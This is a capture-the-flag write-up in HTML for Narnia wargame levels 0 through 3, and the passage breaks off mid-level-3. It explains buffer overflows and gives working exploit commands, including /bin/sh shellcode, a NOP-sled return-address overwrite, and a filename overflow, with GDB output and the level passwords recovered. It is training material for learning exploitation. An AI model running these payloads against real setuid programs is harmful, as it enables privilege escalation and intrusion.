@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Narnia</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        <link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        <script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>
+    </head>
+    <body class="vscode-light">
+        <h1 id="narnia">Narnia</h1>
+<h3 id="narnia-0">Narnia 0</h3>
+<p>UN and PW are both <code>narnia0</code>.
+The code in <code>narnia.c</code> is as follows -</p>
+<pre><code class="language-c"><div><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">long</span> val=<span class="hljs-number">0x41414141</span>;
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">20</span>];
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Correct val's value from 0x41pdf414141 -&gt; 0xdeadbeef!\n"</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here is your chance: "</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%24s"</span>,&amp;buf);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"buf: %s\n"</span>,buf);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"val: 0x%08x\n"</span>,val);
+    <span class="hljs-keyword">if</span>(val==<span class="hljs-number">0xdeadbeef</span>){
+        setreuid(geteuid(),geteuid());
+        system(<span class="hljs-string">"/bin/sh"</span>);
+    }
+    <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"WAY OFF!!!!\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</div></code></pre>
+<p>Executing the compiled code which is a setuid executable, the following is the output -</p>
+<pre><code><code><div>narnia0@narnia:/narnia$ ./narnia0
+Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: hello
+buf: hello
+val: 0x41414141
+WAY OFF!!!!
+</div></code></code></pre>
+<p>Therefore, from both the code and the output above, we need to change the value of <code>val</code> by overwriting the buffer to <code>0xdeadbeef</code>.
+As a first attempt, using 20 B's and 4 Z's as the input to check if the value changes. The output is as follows -</p>
+<pre><code><code><div>narnia0@narnia:/narnia$ ./narnia0
+Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: BBBBBBBBBBBBBBBBBBBBZZZZ
+buf: BBBBBBBBBBBBBBBBBBBBZZZZ
+val: 0x5a5a5a5a
+WAY OFF!!!!
+</div></code></code></pre>
+<p>We see that the 4 bytes in the first 24 in the input change the value of the variable <code>var</code>. Hence using python to print the first 20 characters and then the required value i.e., <code>0xdeadbeef</code> in little endian and passing as input as follows -</p>
+<pre><code class="language-bash"><div>python -c <span class="hljs-string">'print("A"*20 + "\xef\xbe\xad\xde")'</span> | ./narnia0
+</div></code></pre>
+<p>This gives the following output -</p>
+<pre><code><code><div>narnia0@narnia:/narnia$ python -c 'print(&quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;)' | ./narnia0
+Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+val: 0xdeadbeef
+narnia0@narnia:/narnia$
+</div></code></code></pre>
+<p>The thing to notice is that the prompt reappears after the execution. If we append the command <code>whoami</code> to the python print code and run again as follows -</p>
+<pre><code class="language-bash"><div>(python -c <span class="hljs-string">'print("A"*20 + "\xef\xbe\xad\xde")'</span>; whoami) | ./narnia0
+</div></code></pre>
+<p>yields the following output -</p>
+<pre><code><code><div>narnia0@narnia:/narnia$ (python -c 'print(&quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;)'; whoami) | ./narnia0
+Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+val: 0xdeadbeef
+/bin/sh: 1: narnia0: not found
+narnia0@narnia:/narnia$
+</div></code></code></pre>
+<p>This exits the prompt but also prints the highlighted line, which means that the shell executed and was passed the output of <code>whoami</code> command. Therefore, we need to keep the shell opened by using a command that can return and take in commands and outputs like a channel. The command <code>cat</code> does this. Therefore, like previously with the print code, replacing <code>whoami</code> with <code>cat</code>, we get a blank line after the value is prompted which is the shell. Now the password can be read from the narnia1 password location.</p>
+<pre><code><code><div>narnia0@narnia:/narnia$ (python -c 'print(&quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;)'; cat) | ./narnia0
+Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+val: 0xdeadbeef
+id
+uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
+cat /etc/narnia_pass/narnia1
+efeidiedae
+</div></code></code></pre>
+<p>Thus the password for the next level is <code>efeidiedae</code>.</p>
+<hr>
+<h3 id="narnia1">Narnia1</h3>
+<p>The <code>narnia1.c</code> has the following code -</p>
+<pre><code class="language-c"><div><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">int</span> (*ret)();
+    <span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">"EGG"</span>)==<span class="hljs-literal">NULL</span>){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me something to execute at the env-variable EGG\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Trying to execute EGG!\n"</span>);
+    ret = getenv(<span class="hljs-string">"EGG"</span>);
+    ret();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</div></code></pre>
+<p>The code needs a value at the EGG environment variable. If a shellcode is passed at the environment variable EGG, then the getenv function will pass it as a function pointer to ret, which is executed at the end. Therefore, using a shellcode from shell-storm for a <code>/bin/sh</code> execution, we can set the variable as follows -</p>
+<pre><code class="language-bash"><div><span class="hljs-built_in">export</span> EGG=$(python -c <span class="hljs-string">'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")'</span>)
+</div></code></pre>
+<p>After this, upon executing the compiled code, we get the following -</p>
+<pre><code><code><div>narnia1@narnia:/narnia$ ./narnia1
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2
+nairiepecu
+</div></code></code></pre>
+<p>Thus the password for the next level is <code>nairiepecu</code>.</p>
+<hr>
+<h3 id="narnia2">Narnia2</h3>
+<p>The code of <code>narnia2.c</code> contains the following -</p>
+<pre><code class="language-c"><div><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span></span>{
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];
+    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">1</span>){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage: %s argument\n"</span>, argv[<span class="hljs-number">0</span>]);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+    <span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buf);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</div></code></pre>
+<p>This is a typical buffer overflow problem, where the character array called <code>buf</code> is loaded with a string from the arguments using <code>strcpy</code>, which does not check for the allocation bounds of the variable. Therefore, in this case, we can write to the memory outside the defined bound of 128 characters. The aim is to overwrite enough to change the value of EIP, which stores the address of the next instruction. This can be checked using GDB.
+Running using a python code to fill the buffer using A's and using hit and trial to reach a conclusion, which is the number of bytes required to pass as the argument to overwrite the EIP. This is checked in GDB as follows -</p>
+<pre><code><code><div>narnia2@narnia:/narnia$ gdb -q narnia2
+Reading symbols from narnia2...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804844b &lt;+0&gt;:     push   %ebp
+   0x0804844c &lt;+1&gt;:     mov    %esp,%ebp
+   0x0804844e &lt;+3&gt;:     add    $0xffffff80,%esp
+   0x08048451 &lt;+6&gt;:     cmpl   $0x1,0x8(%ebp)
+   0x08048455 &lt;+10&gt;:    jne    0x8048471 &lt;main+38&gt;
+   0x08048457 &lt;+12&gt;:    mov    0xc(%ebp),%eax
+   0x0804845a &lt;+15&gt;:    mov    (%eax),%eax
+   0x0804845c &lt;+17&gt;:    push   %eax
+   0x0804845d &lt;+18&gt;:    push   $0x8048520
+   0x08048462 &lt;+23&gt;:    call   0x8048300 &lt;printf@plt&gt;
+   0x08048467 &lt;+28&gt;:    add    $0x8,%esp
+   0x0804846a &lt;+31&gt;:    push   $0x1
+   0x0804846c &lt;+33&gt;:    call   0x8048320 &lt;exit@plt&gt;
+   0x08048471 &lt;+38&gt;:    mov    0xc(%ebp),%eax
+   0x08048474 &lt;+41&gt;:    add    $0x4,%eax
+   0x08048477 &lt;+44&gt;:    mov    (%eax),%eax
+   0x08048479 &lt;+46&gt;:    push   %eax
+   0x0804847a &lt;+47&gt;:    lea    -0x80(%ebp),%eax
+   0x0804847d &lt;+50&gt;:    push   %eax
+   0x0804847e &lt;+51&gt;:    call   0x8048310 &lt;strcpy@plt&gt;                      
+   0x08048483 &lt;+56&gt;:    add    $0x8,%esp
+   0x08048486 &lt;+59&gt;:    lea    -0x80(%ebp),%eax
+   0x08048489 &lt;+62&gt;:    push   %eax
+   0x0804848a &lt;+63&gt;:    push   $0x8048534
+   0x0804848f &lt;+68&gt;:    call   0x8048300 &lt;printf@plt&gt;
+   0x08048494 &lt;+73&gt;:    add    $0x8,%esp
+   0x08048497 &lt;+76&gt;:    mov    $0x0,%eax
+   0x0804849c &lt;+81&gt;:    leave
+   0x0804849d &lt;+82&gt;:    ret
+End of assembler dump.
+(gdb) break *main+56
+Breakpoint 1 at 0x8048483
+(gdb) r $(python -c 'print(&quot;A&quot;*132)')
+Starting program: /narnia/narnia2 $(python -c 'print(&quot;A&quot;*132)')
+Breakpoint 1, 0x08048483 in main ()
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6             &lt;------ EIP value not 0x41414141
+(gdb) r $(python -c 'print(&quot;A&quot;*136)')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia2 $(python -c 'print(&quot;A&quot;*136)')
+Breakpoint 1, 0x08048483 in main ()
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()                                                                       &lt;------ EIP value is 0x41414141
+(gdb) i r
+eax            0x0      0
+ecx            0x7fffff77       2147483511
+edx            0xf7fc6870       -134453136
+ebx            0x0      0
+esp            0xffffd640       0xffffd640
+ebp            0x41414141       0x41414141
+esi            0x2      2
+edi            0xf7fc5000       -134459392
+eip            0x41414141       0x41414141                                       &lt;------ Confirmed here using info registers.
+eflags         0x10286  [ PF SF IF RF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+</div></code></code></pre>
+<p>Therefore, the last 4 bytes of a 136 byte payload overwrite the EIP. Now the aim is to put a shellcode in the stack somewhere and overwrite the EIP to execute that shellcode. Therefore, the total amount of bytes for use is 132. To check the start and end of the stack where this input is placed, to find a suitable address to place the payload, we use GDB again -</p>
+<pre><code><code><div>(gdb) r $(python -c 'print(&quot;A&quot;*132 + &quot;BBBB&quot;)')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia2 $(python -c 'print(&quot;A&quot;*132 + &quot;BBBB&quot;)')
+
+(gdb) x/60wx $esp+0x198                                                                               &lt;-------- beyond current esp
+0xffffd7d8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd7e8:     0x17000000      0x47369042      0x07bfea54      0x85458d9d
+0xffffd7f8:     0x695e50dd      0x00363836      0x00000000      0x00000000
+0xffffd808:     0x72616e2f      0x2f61696e      0x6e72616e      0x00326169
+0xffffd818:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd828:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd838:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd848:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd858:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd868:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd878:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd888:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd898:     0x41414141      0x42424242      0x5f434c00      0x3d4c4c41              &lt;--------- BBBB is here
+0xffffd8a8:     0x555f6e65      0x54552e53      0x00382d46      0x435f534c
+0xffffd8b8:     0x524f4c4f      0x73723d53      0x643a303d      0x31303d69
+</div></code></code></pre>
+<p>Now, we fill almost all locations with NOP's or <code>\x90</code>'s apart from the shell code and an address to jump. The <code>/bin/dash</code> payload can be used which is 25 bytes long - <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80</code>.
+Therefore, if we replace all the A's with NOPs, then we can jump to one of those instructions and have it skip to the payload. The stack space we have for this is 132 bytes long and starts at <code>0xffffd818</code>. Therefore, keeping standard deviations in mind for execution differences between actual program and gdb instance due to environment variables and other stuff, we can jump to the address <code>0xffffd830</code>. We will write 132-25=107 bytes of NOPs and then append the payload for 25 bytes followed by the address we need to jump to. This executed in gdb looks like -</p>
+<pre><code><code><div>(gdb) r $(python -c 'print(&quot;\x90&quot;*107 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89
+\xe1\x89\xc2\xb0\x0b\xcd\x80&quot; + &quot;\x30\xd8\xff\xff&quot;)')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia2 $(python -c 'print(&quot;\x90&quot;*107
++ &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;
++ &quot;\x30\xd8\xff\xff&quot;)')
+process 15288 is executing new program: /bin/dash
+$ whoami
+narnia2
+</div></code></code></pre>
+<p>It starts the shell but the prompt returns narnia2 because it is executed inside of gdb. On executing it on the bash of narnia2, on the setuid executable <code>narnia2</code>, we get the shell and can read password as follows -</p>
+<pre><code class="language-bash"><div>narnia2@narnia:/narnia$ ./narnia2 $(python -c <span class="hljs-string">'print("\x90"*107
++ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
++ "\x40\xd8\xff\xff")'</span>)
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
+</div></code></pre>
+<p>Thus, the password for narnia3 is <code>vaequeezee</code>.</p>
+<hr>
+<h3 id="narnia3">Narnia3</h3>
+<p>The code of <code>narnia3.c</code> contains the following -</p>
+<pre><code class="language-c"><div><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>{
+    <span class="hljs-keyword">int</span>  ifd,  ofd;
+    <span class="hljs-keyword">char</span> ofile[<span class="hljs-number">16</span>] = <span class="hljs-string">"/dev/null"</span>;
+    <span class="hljs-keyword">char</span> ifile[<span class="hljs-number">32</span>];
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">32</span>];
+    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"usage, %s file, will send contents of file 2 /dev/null\n"</span>,argv[<span class="hljs-number">0</span>]);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    }
+    <span class="hljs-built_in">strcpy</span>(ifile, argv[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">if</span>((ofd = open(ofile,O_RDWR)) &lt; <span class="hljs-number">0</span> ){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error opening %s\n"</span>, ofile);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    }
+    <span class="hljs-keyword">if</span>((ifd = open(ifile, O_RDONLY)) &lt; <span class="hljs-number">0</span> ){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error opening %s\n"</span>, ifile);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    }
+    read(ifd, buf, <span class="hljs-keyword">sizeof</span>(buf)<span class="hljs-number">-1</span>);
+    write(ofd,buf, <span class="hljs-keyword">sizeof</span>(buf)<span class="hljs-number">-1</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"copied contents of %s to a safer place... (%s)\n"</span>,ifile,ofile);
+    close(ifd);
+    close(ofd);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+}
+</div></code></pre>
+<p>Here the code basically writes the contents of a file to another file, the name of which appears to be static. Therefore, the first thing which is also the intended and obvious way is that the file from which contents are to be read should be the password file of narnia4 and the file to write to should be a file. Looking at the code in assembly, the following is in intel syntax and the places marked with '&lt;-------- location' are where logically the file open check seem to be located. These are located using the open system calls.</p>
+<pre><code><code><div>narnia3@narnia:/narnia$ gdb -q narnia3
+Reading symbols from narnia3...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804850b &lt;+0&gt;:     push   ebp
+   0x0804850c &lt;+1&gt;:     mov    ebp,esp
+   0x0804850e &lt;+3&gt;:     sub    esp,0x58
+   0x08048511 &lt;+6&gt;:     mov    DWORD PTR [ebp-0x18],0x7665642f
+   0x08048518 &lt;+13&gt;:    mov    DWORD PTR [ebp-0x14],0x6c756e2f
+   0x0804851f &lt;+20&gt;:    mov    DWORD PTR [ebp-0x10],0x6c
+   0x08048526 &lt;+27&gt;:    mov    DWORD PTR [ebp-0xc],0x0
+   0x0804852d &lt;+34&gt;:    cmp    DWORD PTR [ebp+0x8],0x2
+   0x08048531 &lt;+38&gt;:    je     0x804854d &lt;main+66&gt;
+   0x08048533 &lt;+40&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+   0x08048536 &lt;+43&gt;:    mov    eax,DWORD PTR [eax]
+   0x08048538 &lt;+45&gt;:    push   eax
+   0x08048539 &lt;+46&gt;:    push   0x80486a0
+   0x0804853e &lt;+51&gt;:    call   0x8048390 &lt;printf@plt&gt;
+   0x08048543 &lt;+56&gt;:    add    esp,0x8
+   0x08048546 &lt;+59&gt;:    push   0xffffffff
+   0x08048548 &lt;+61&gt;:    call   0x80483b0 &lt;exit@plt&gt;
+   0x0804854d &lt;+66&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+   0x08048550 &lt;+69&gt;:    add    eax,0x4
+   0x08048553 &lt;+72&gt;:    mov    eax,DWORD PTR [eax]
+   0x08048555 &lt;+74&gt;:    push   eax
+   0x08048556 &lt;+75&gt;:    lea    eax,[ebp-0x38]
+   0x08048559 &lt;+78&gt;:    push   eax
+   0x0804855a &lt;+79&gt;:    call   0x80483a0 &lt;strcpy@plt&gt;
+   0x0804855f &lt;+84&gt;:    add    esp,0x8
+   0x08048562 &lt;+87&gt;:    push   0x2
+   0x08048564 &lt;+89&gt;:    lea    eax,[ebp-0x18]                         &lt;---------- location
+   0x08048567 &lt;+92&gt;:    push   eax
+   0x08048568 &lt;+93&gt;:    call   0x80483c0 &lt;open@plt&gt;
+   0x0804856d &lt;+98&gt;:    add    esp,0x8
+   0x08048570 &lt;+101&gt;:   mov    DWORD PTR [ebp-0x4],eax
+   0x08048573 &lt;+104&gt;:   cmp    DWORD PTR [ebp-0x4],0x0
+   0x08048577 &lt;+108&gt;:   jns    0x8048591 &lt;main+134&gt;
+   0x08048579 &lt;+110&gt;:   lea    eax,[ebp-0x18]                        
+   0x0804857c &lt;+113&gt;:   push   eax                                          
+   0x0804857d &lt;+114&gt;:   push   0x80486d8                              
+   0x08048582 &lt;+119&gt;:   call   0x8048390 &lt;printf@plt&gt;          
+   0x08048587 &lt;+124&gt;:   add    esp,0x8                                    
+   0x0804858a &lt;+127&gt;:   push   0xffffffff                                   
+   0x0804858c &lt;+129&gt;:   call   0x80483b0 &lt;exit@plt&gt;              
+   0x08048591 &lt;+134&gt;:   push   0x0                                          
+   0x08048593 &lt;+136&gt;:   lea    eax,[ebp-0x38]                      &lt;---------- location
+   0x08048596 &lt;+139&gt;:   push   eax
+   0x08048597 &lt;+140&gt;:   call   0x80483c0 &lt;open@plt&gt;
+   0x0804859c &lt;+145&gt;:   add    esp,0x8
+   0x0804859f &lt;+148&gt;:   mov    DWORD PTR [ebp-0x8],eax
+   0x080485a2 &lt;+151&gt;:   cmp    DWORD PTR [ebp-0x8],0x0
+   0x080485a6 &lt;+155&gt;:   jns    0x80485c0 &lt;main+181&gt;
+   0x080485a8 &lt;+157&gt;:   lea    eax,[ebp-0x38]                         
+   0x080485ab &lt;+160&gt;:   push   eax
+   0x080485ac &lt;+161&gt;:   push   0x80486d8
+   0x080485b1 &lt;+166&gt;:   call   0x8048390 &lt;printf@plt&gt;
+   0x080485b6 &lt;+171&gt;:   add    esp,0x8
+   0x080485b9 &lt;+174&gt;:   push   0xffffffff
+   0x080485bb &lt;+176&gt;:   call   0x80483b0 &lt;exit@plt&gt;
+   0x080485c0 &lt;+181&gt;:   push   0x1f
+   0x080485c2 &lt;+183&gt;:   lea    eax,[ebp-0x58]
+   0x080485c5 &lt;+186&gt;:   push   eax
+   0x080485c6 &lt;+187&gt;:   push   DWORD PTR [ebp-0x8]
+   0x080485c9 &lt;+190&gt;:   call   0x8048380 &lt;read@plt&gt;
+   0x080485ce &lt;+195&gt;:   add    esp,0xc
+   0x080485d1 &lt;+198&gt;:   push   0x1f
+   0x080485d3 &lt;+200&gt;:   lea    eax,[ebp-0x58]
+   0x080485d6 &lt;+203&gt;:   push   eax
+   0x080485d7 &lt;+204&gt;:   push   DWORD PTR [ebp-0x4]
+   0x080485da &lt;+207&gt;:   call   0x80483e0 &lt;write@plt&gt;
+   0x080485df &lt;+212&gt;:   add    esp,0xc
+   0x080485e2 &lt;+215&gt;:   lea    eax,[ebp-0x18]
+   0x080485e5 &lt;+218&gt;:   push   eax
+   0x080485e6 &lt;+219&gt;:   lea    eax,[ebp-0x38]
+   0x080485e9 &lt;+222&gt;:   push   eax
+   0x080485ea &lt;+223&gt;:   push   0x80486ec
+   0x080485ef &lt;+228&gt;:   call   0x8048390 &lt;printf@plt&gt;
+   0x080485f4 &lt;+233&gt;:   add    esp,0xc
+   0x080485f7 &lt;+236&gt;:   push   DWORD PTR [ebp-0x8]
+   0x080485fa &lt;+239&gt;:   call   0x80483f0 &lt;close@plt&gt;
+   0x080485ff &lt;+244&gt;:   add    esp,0x4
+   0x08048602 &lt;+247&gt;:   push   DWORD PTR [ebp-0x4]
+   0x08048605 &lt;+250&gt;:   call   0x80483f0 &lt;close@plt&gt;
+   0x0804860a &lt;+255&gt;:   add    esp,0x4
+   0x0804860d &lt;+258&gt;:   push   0x1
+   0x0804860f &lt;+260&gt;:   call   0x80483b0 &lt;exit@plt&gt;
+End of assembler dump.
+</div></code></code></pre>
+<p>Therefore, to check the contents of the registers we can type in a filename that exists and see how the program behaves by placing an breakpoint right before the exit (the one that will be called following the flow of the program). The different function calls, jump and function names can be used to figure out the flow of the program. Putting in the filename as follows -</p>
+<pre><code><code><div>narnia3@narnia:/narnia$ touch /tmp/tanqblast
+</div></code></code></pre>
+<p>After this the gdb session is as follows, where we can check the contents of the marked locations to check for the names and confirm what is to be overflowed -</p>
+<pre><code><code><div>narnia3@narnia:/narnia$ gdb -q narnia3
+Reading symbols from narnia3...(no debugging symbols found)...done.
+(gdb) break *main+258
+Breakpoint 1 at 0x804860d
+(gdb) r /tmp/tanqblast
+Starting program: /narnia/narnia3 /tmp/tanqblast
+copied contents of /tmp/tanqblast to a safer place... (/dev/null)
+
+Breakpoint 1, 0x0804860d in main ()
+(gdb) x/10s $ebp-0x38
+0xffffd680:     &quot;/tmp/tanqblast&quot;
+0xffffd68f:     &quot;\b\002&quot;
+0xffffd692:     &quot;&quot;
+0xffffd693:     &quot;&quot;
+0xffffd694:     &quot;T\327\377\377`\327\377\377A\206\004\b/dev/null&quot;
+0xffffd6aa:     &quot;&quot;
+0xffffd6ab:     &quot;&quot;
+0xffffd6ac:     &quot;&quot;
+0xffffd6ad:     &quot;&quot;
+0xffffd6ae:     &quot;&quot;
+(gdb) x/10s $ebp-0x18
+0xffffd6a0:     &quot;/dev/null&quot;
+0xffffd6aa:     &quot;&quot;
+0xffffd6ab:     &quot;&quot;
+0xffffd6ac:     &quot;&quot;
+0xffffd6ad:     &quot;&quot;
+0xffffd6ae:     &quot;&quot;
+0xffffd6af:     &quot;&quot;
+0xffffd6b0:     &quot;\004&quot;
+0xffffd6b2:     &quot;&quot;
+0xffffd6b3:     &quot;&quot;
+</div></code></code></pre>
+<p>This confirms that the location <code>ebp-0x38</code> is the file that is to be read and is also taken as an input in form of an argument. The string at <code>ebp-0x18</code> is the filename of the file that the program writes to. With arithmetic, the difference between the files is of 32 bytes. The name file which is to be written comes after that of the file from which the contents are to be taken in the stack. Therefore, this can be overflowed. Since the variable is static, this means that the contents can be overwritten with a new value upon overloading. Now, to enter a string, keeping in mind that there are delimiters also associated with the strings, we cannot enter a <code>\n</code> in the string to overload. Therefore, we can use the fact that a file inside a subfolder of the current directory can have the same name as the one inside the current directory as the complete path is still different. Also, if a file name is referred to without a relative path from <code>/</code>, then the file is searched from the current directory even from program execution. Therefore, this can be used to frame the name of the input and the output file by giving the output file the name of the file in the current directory while the input file will be the one inside the sub directory. To place the string of the name of the output file at the perfect position, the difference of the variable locations must be filled i.e., the 32 bytes must be occupied by the path length of the current folder name and the subdirectory. Therefore, trying this out with test files and proper permissions as follows -</p>
+<pre><code><code><div>narnia3@narnia:~$ mkdir /tmp/tanq
+narnia3@narnia:~$ cd /tmp/tanq
+narnia3@narnia:/tmp/tanq$ mkdir $(python -c 'print(&quot;a&quot;*21)')
+narnia3@narnia:/tmp/tanq$ cd aaaaaaaaaaaaaaaaaaaaa/
+narnia3@narnia:/tmp/tanq/aaaaaaaaaaaaaaaaaaaaa$ echo &quot;this is to be read&quot; &gt; readfile
+narnia3@narnia:/tmp/tanq/aaaaaaaaaaaaaaaaaaaaa$ cat readfile
+this is to be read
+narnia3@narnia:/tmp/tanq/aaaaaaaaaaaaaaaaaaaaa$ cd ..
+narnia3@narnia:/tmp/tanq$ touch readfile
